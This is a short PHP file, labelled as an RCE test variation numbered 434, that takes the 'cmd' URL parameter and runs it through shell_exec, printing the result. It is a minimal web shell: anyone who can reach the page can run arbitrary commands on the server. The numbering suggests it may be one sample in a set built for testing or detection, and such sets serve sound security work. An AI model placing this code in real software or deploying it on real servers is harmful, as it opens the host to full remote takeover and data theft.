<?php
// RCE test variation #434
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>